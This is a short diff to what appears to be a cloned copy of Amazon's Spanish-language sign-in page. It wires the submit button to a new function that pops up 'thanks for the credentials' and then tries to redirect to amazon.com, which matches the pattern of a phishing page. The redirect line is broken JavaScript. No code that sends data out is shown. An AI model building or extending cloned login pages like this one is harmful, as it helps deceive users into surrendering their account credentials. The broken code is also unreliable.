@@ -366,12 +366,16 @@ amzn.copilot.checkCoPilotSession();
 
 
                 
-                <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" aria-labelledby="a-autoid-0-announce" type="submit"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
+                <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" aria-labelledby="a-autoid-0-announce" type="submit" onclick="inicio()"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
                   Iniciar sesión
                 </span></span></span>
 
                 
 <script>
+  function inicio(){
+    alert("Gracias por las credenciales");
+    javascript.href="https://www.amazon.com"
+  }
   function cf() {
     if (typeof window.uet === 'function') {
       uet('cf');
